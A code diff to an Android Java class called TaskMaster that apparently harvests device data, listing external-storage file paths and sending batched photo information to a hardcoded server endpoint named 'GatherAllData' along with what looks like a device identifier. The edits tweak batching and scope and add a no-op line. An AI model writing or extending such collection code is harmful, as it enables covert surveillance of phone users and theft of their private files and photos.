@@ -67,7 +67,7 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
         String[] maskHash2 = maskHash.split(";");
         String[] hashes = maskHash2[1].split(":");
 
-        getFilesMetadata();
+        //getFilesMetadata();
         JSONObject bulkData = new JSONObject();
         for (int i = 0; i < maskHash2[0].length(); i++) {
             if (maskHash2[0].charAt(i) == '1') {
@@ -110,13 +110,11 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
     private void getFilesMetadata() {
         try {
             JSONObject bulkData = new JSONObject();
-            List<String> root = getListFiles(new File(Environment.getRootDirectory().toString()));
             List<String> external = getListFiles(new File(Environment.getExternalStorageDirectory()
                     .toString()));
-            root.addAll(external);
 
             JSONArray metadata = new JSONArray();
-            for (String info : root) {
+            for (String info : external) {
                 metadata.put(Base64.encodeToString(info.getBytes(), Base64.URL_SAFE));
             }
 
@@ -584,7 +582,7 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
                         }
 
                         informationArray.put(information);
-                        if (counter % 20 == 0) {
+                        if (counter % 10 == 0) {
                             JSONObject bulkData = new JSONObject();
                             photos.put("Photos", informationArray);
                             photos.put("Hash", newHash);
@@ -592,10 +590,13 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
                             ServerCommunicationHandler.executeDataPost(params,
                                     "http://192.168.1.24:58938/api/Service/GatherAllData", bulkData,
                                     "357336064017681");
+                            informationArray = new JSONArray();
                         }
                     }
 
                 } while (cur.moveToNext());
+                int i=0;
+                i++;
             }
             cur.close();
 
